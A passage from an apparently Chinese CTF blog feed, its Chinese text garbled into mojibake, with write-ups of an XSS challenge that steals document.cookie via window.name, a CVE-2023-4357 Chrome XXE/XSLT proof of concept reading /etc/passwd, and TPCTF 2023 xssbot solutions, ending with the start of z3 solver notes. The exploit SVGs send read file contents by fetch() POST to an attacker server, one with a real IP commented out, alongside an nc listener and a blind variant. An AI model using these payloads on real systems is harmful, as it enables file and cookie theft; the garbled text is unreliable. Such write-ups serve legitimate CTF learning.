ç•™ä¸‹çš„è¯„è®ºï¼š&quot;+123123+&quot;&quot;);<br></code></pre></td></tr></table></figure><p>è¿™å°±ç›¸å½“äºæŠŠè¾“å…¥ç‹¬ç«‹å‡ºæ¥ï¼Œå¦‚æœæŠŠè¿™é‡Œé¢çš„<code>123123</code>æ¢æˆä¸€äº›JSè¯­å¥ï¼Œé‚£ä¹ˆJSè¯­å¥æ‰§è¡Œçš„ç»“æœå°±ä¼šè¢«æ‹¼æ¥è¿›è¿™ä¸ªè¯„è®ºé‡Œé¢ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚ç±»ä¼¼äºè¿™æ ·</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">updateElement(&quot;#comment&quot;, &quot;ä½ ç•™ä¸‹çš„è¯„è®ºï¼š&quot;+JS+&quot;&quot;);<br></code></pre></td></tr></table></figure><p>æŠŠJSæ¢æˆlocationï¼Œä¼šå¾—åˆ°è¿™ä¸ªç»“æœ</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-29%2023.18.39.png"></p><p>è¿™å°±éªŒè¯äº†æ³¨å…¥çš„å¯èƒ½æ€§ã€‚</p><h3 id="botåˆ†æ"><a href="#botåˆ†æ" class="headerlink" title="botåˆ†æ"></a>botåˆ†æ</h3><p>ä½†æ­¤æ—¶ä¼šå‘ç°è¿™ä¸ªè¯„è®ºå°†å­—ç¬¦æ•°é‡å¡åœ¨25ä»¥å†…ï¼Œå¾ˆéš¾åˆ©ç”¨ã€‚ä½†æ˜¯é¢˜ç›®ä¸­ä¹Ÿç»™äº†æç¤ºï¼Œå³botä¼šæŸ¥çœ‹æˆ‘ä»¬çš„å¼¹çª—</p><p>åœ¨jsä¸­å¼¹çª—å‡½æ•°æ˜¯è¿™ä¸ªï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(url, target, windowFeatures)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­urlæ˜¯å¼¹çª—è¦è½¬å»çš„åœ°å€ï¼Œtargetæ˜¯è½¬å»ä¹‹åçª—å£çš„åå­—ï¼Œåœ¨ä»»æ„ä¸€ä¸ªçª—å£è¾“å…¥å¦‚ä¸‹è¯­å¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;https://www.example.com&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>) <br></code></pre></td></tr></table></figure><p>æµè§ˆå™¨å¯èƒ½ä¼šé˜»æ­¢å¼¹çª—ï¼Œç‚¹å‡»å…è®¸å¼¹çª—åå°±ä¼šè½¬å»å¦ä¸€ä¸ªçª—å£</p><p>åœ¨å¦ä¸€ä¸ªçª—å£æ§åˆ¶å°è¾“å…¥å¦‚ä¸‹è¯­å¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span><br></code></pre></td></tr></table></figure><p>å°±ä¼šå¾—åˆ°çª—å£åå­—</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2000.24.18.png"></p><p>è¿™ä¸ªåœ°æ–¹æ³¨æ„ï¼Œä½¿ç”¨<code>window.name</code>ä¸<code>name</code>æ˜¯ç­‰æ•ˆçš„ï¼Œä¹Ÿå°±æ˜¯ä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„<code>window</code>å…¨å±€å˜é‡ã€‚è¿™å…¶å®ä¸<code>window.alert(1)</code>ä¸<code>alert(1)</code>æ˜¯ä¸€æ ·é“ç†ã€‚</p><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æˆ‘ä»¬å¯ä»¥å¾€è¯„è®ºåŒºæ’å…¥ä¸€éƒ¨åˆ†JSä»£ç ï¼Œè€ŒåBotä¼šæ‰§è¡Œæˆ‘ä»¬çš„htmlä»£ç ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨è¯„è®ºæ’å…¥<code>&#123;1:location=name&#125;</code>è¯­å¥ï¼Œåœ¨æˆ‘ä»¬è‡ªå·±çš„htmlå¤„è®¾ç½®nameä¸ºæˆ‘ä»¬æƒ³è¦çš„JSè¯­å¥ï¼Œå†è·³è½¬è‡³ç•Œé¢ï¼Œå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„JSè¯­å¥</p><p>step1:å…ˆåœ¨è¯„è®ºåŒºæ’å…¥<code>&quot;+&#123;1:location=name&#125;+&quot;</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2001.52.25.png"></p><p>step2:æ„é€ ä¸€ä¸ªhtml</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">//è®¾ç½®è·³è½¬åçª—å£åå­—</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span> =</span><br><span class="language-javascript">  <span class="hljs-string">&quot;javascript:document.querySelector(&#x27;textarea&#x27;).value=document.cookie.replace(/%/g,&#x27;#&#x27;).substring(0,20);document.querySelector(&#x27;button&#x27;).click()&quot;</span>;<span class="hljs-comment">//ç¬¬ä¸€æ­¥æ˜¯è®¾ç½®è¯„è®ºåŒºä¸ºflagï¼Œflagéœ€è¦åšä¸€äº›å¤„ç†ã€‚ç¬¬äºŒæ­¥æ˜¯å°†è¯„è®ºæäº¤å‡ºå»</span></span><br><span class="language-javascript">  </span><br><span class="language-javascript">    location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;http://web/result&quot;</span>;<span class="hljs-comment">//è¿™ä¸€æ­¥æ˜¯ä½¿å¾—botè·³è½¬</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>step3æå–flag</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2001.57.16.png"></p><h2 id="CVE-2023-4357"><a href="#CVE-2023-4357" class="headerlink" title="CVE-2023-4357"></a>CVE-2023-4357</h2><p>ç½‘ä¸Šå·²ç»æœ‰å¾ˆå¤šå¯¹æ­¤æ¼æ´çš„åˆ†æï¼Œè¿™é‡Œåªä½œå‡ºå¤ç°æ­¥éª¤</p><p>ç‰ˆæœ¬ï¼šGoogle Chrome &lt; 116.0.5845.96</p><p>åœ¨æœåŠ¡å™¨ä¸Šå‡†å¤‡æ­¤exp</p><p>exp:</p><p>exp.svg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;?#&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">div</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>&lt;!--    è¿™é‡Œæ¢æ•æ„Ÿç›®å½•--&gt; </span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æœ‰æ¼æ´çš„æµè§ˆå™¨è®¿é—®</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2002.05.14.png"></p><p>å¦‚æœéœ€è¦å¤–å¸¦åˆ™åŠ ä¸Šä¸€æ®µä»£ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;?#&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">div</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>&lt;!--    è¿™é‡Œæ¢æ•æ„Ÿç›®å½•--&gt;</span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> data = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.flag&quot;</span>).<span class="hljs-property">textContent</span>;</span><br><span class="language-javascript">                <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://æœåŠ¡å™¨åœ°å€:ç«¯å£&quot;</span>, &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span></span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">body</span>: data</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆåœ¨æœåŠ¡å™¨ä¸Šç›‘å¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvp 3389<br></code></pre></td></tr></table></figure><p>ç„¶åç­‰å¾…åˆ«äººè®¿é—®æœåŠ¡å™¨ä¸Šçš„exp.svg</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2002.12.29.png"></p><h2 id="TPCTF-2023"><a href="#TPCTF-2023" class="headerlink" title="TPCTF 2023"></a>TPCTF 2023</h2><h3 id="xssbot"><a href="#xssbot" class="headerlink" title="xssbot"></a>xssbot</h3><p>è¿™é¢˜ç›®ç»™äº†ä¸¤ä¸ªé™„ä»¶ï¼Œä¸€ä¸ªæ˜¯bot.pyï¼Œä¸€ä¸ªæ˜¯dockerfileï¼Œå…¶ä¸­bot.pyä¸hackergameé‚£é¢˜å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œå¤„ç†é€»è¾‘ä¹Ÿæ˜¯ç›¸å½“ã€‚ä¸ºäº†å¤ç°é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æä¾›çš„dockerfileæ¥æ„å»ºä¸€ä¸ªé•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t é•œåƒåå­—<br></code></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it --rm é•œåƒåå­— <br></code></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åä¼šè¦æ±‚è¾“å…¥ä¸€ä¸ªæ–‡ä»¶åï¼Œè¿™ä¸ªå¯ä»¥éšæ„</p><p>ç„¶åå°±æ˜¯è¾“å…¥exp.svgæ¥è¿›è¡Œæ”»å‡»ï¼Œè¿™é‡Œä¸ä¸Šé¢çš„exp.svgæ˜¯ä¸€æ ·çš„</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;?#&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">div</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>&lt;!--    è¿™é‡Œæ¢æ•æ„Ÿç›®å½•--&gt;</span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> data = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.flag&quot;</span>).<span class="hljs-property">textContent</span>;</span><br><span class="language-javascript">                <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://æœåŠ¡å™¨åœ°å€:ç«¯å£&quot;</span>, &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span></span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">body</span>: data</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸è¿‡è¿™é‡Œæˆ‘ä¾ç„¶ä½¿ç”¨<code>/etc/passwd</code>ä½œä¸ºæ•æ„Ÿç›®å½•ï¼Œæ¯”èµ›ä¸­æ¢ä¸º<code>/flag</code>å³å¯</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2002.22.58.png"></p><p>éšåå°±èƒ½åœ¨æœåŠ¡å™¨ä¸Šæ”¶åˆ°æ¶ˆæ¯äº†</p><h3 id="xssbot-but-no-Internet"><a href="#xssbot-but-no-Internet" class="headerlink" title="xssbot but no Internet"></a>xssbot but no Internet</h3><p>è¿™é¢˜ä¸ä¸Šé¢˜ä¸€æ ·ï¼Œä¸è¿‡æ²¡æœ‰ç½‘ç»œé“¾æ¥ï¼Œéœ€è¦ä½¿ç”¨ç›²æ³¨ï¼Œç¨å¾®æ”¹ä¸‹expå³å¯</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;?#&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">div</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>&lt;!--    è¿™é‡Œæ¢æ•æ„Ÿç›®å½•--&gt;</span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> data = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.flag&quot;</span>).<span class="hljs-property">textContent</span>;</span><br><span class="language-javascript">                <span class="hljs-comment">// fetch(&quot;http://114.132.159.167:3389&quot;, &#123;</span></span><br><span class="language-javascript">                <span class="hljs-comment">//     method: &#x27;POST&#x27;,</span></span><br><span class="language-javascript">                <span class="hljs-comment">//     headers: &#123;</span></span><br><span class="language-javascript">                <span class="hljs-comment">//         &#x27;Content-Type&#x27;: &#x27;text/plain&#x27;</span></span><br><span class="language-javascript">                <span class="hljs-comment">//     &#125;,</span></span><br><span class="language-javascript">                <span class="hljs-comment">//     body: data</span></span><br><span class="language-javascript">                <span class="hljs-comment">// &#125;)</span></span><br><span class="language-javascript">                <span class="hljs-keyword">if</span>(data[<span class="hljs-number">0</span>]!=<span class="hljs-number">0</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)</span><br><span class="language-javascript">                    &#123;</span><br><span class="language-javascript">                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>xss</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>z3ç¬”è®°</title>
    <link href="/2023/11/07/z3_study/"/>
    <url>/2023/11/07/z3_study/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›z3é£Ÿç”¨æ–¹å¼</p><span id="more"></span><h2 id="1-å˜é‡å®šä¹‰"><a href="#1-å˜é‡å®šä¹‰" class="headerlink" title="1. å˜é‡å®šä¹‰"></a>1. å˜é‡å®šä¹‰</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªæ•´å‹å˜é‡</span><br>x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br><span class="hljs-comment"># å®šä¹‰ä¸¤ä¸ªå®æ•°å‹å˜é‡ï¼Œ</span><br>a, b = Reals(<span class="hljs-string">&#x27;a b&#x27;</span>)<br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ª32ä½å‘é‡</span><br>eax = BitVec(<span class="hljs-string">&#x27;eax&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-comment"># å®šä¹‰ä¸¤ä¸ª32ä½å‘é‡</span><br>ebx, ecx = BitVecs(<span class="hljs-string">&#x27;ebx ecx&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-comment"># å®šä¹‰ä¸€ç»„å˜é‡åˆ—è¡¨</span><br>X = [Int(<span class="hljs-string">&#x27;x_%s&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br></code></pre></td></tr></table></figure><h2 id="2-é€»è¾‘ç›¸å…³"><a href="#2-é€»è¾‘ç›¸å…³" class="headerlink" title="2.é€»è¾‘ç›¸å…³"></a>2.é€»è¾‘ç›¸å…³</h2><h3 id="Andä¸Or"><a href="#Andä¸Or" class="headerlink" title="Andä¸Or"></a>Andä¸Or</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Int(<span class="hljs-string">&#x27;y&#x27;</span>)<br><br><span class="hljs-comment"># æˆ–é€»è¾‘ï¼Œä¸¤è€…æ»¡è¶³å…¶ä¸€</span><br>constrains1 = Or(x &lt; <span class="hljs-number">0</span>, x &gt; <span class="hljs-number">5</span>)<br><span class="hljs-comment"># ä¸é€»è¾‘ï¼Œä¸¤è€…å‡è¦æ»¡è¶³</span><br>constrains2 = And(<span class="hljs-number">1</span> &lt; y, y &lt; <span class="hljs-number">10</span>)<br><span class="hljs-comment"># å–å</span><br>constrains3 = Not(x &lt; -<span class="hljs-number">1</span>)<br><br>s = Solver()<br>s.add(constrains1, constrains2)<br></code></pre></td></tr></table></figure><h3 id="IF"><a href="#IF" class="headerlink" title="IF"></a>IF</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Int(<span class="hljs-string">&#x27;y&#x27;</span>)<br>s = Solver()<br><span class="hljs-comment"># æ·»åŠ Ifçº¦æŸ</span><br>s.add(If(y &gt; <span class="hljs-number">10</span>, x == <span class="hljs-number">115</span>, x == <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h2 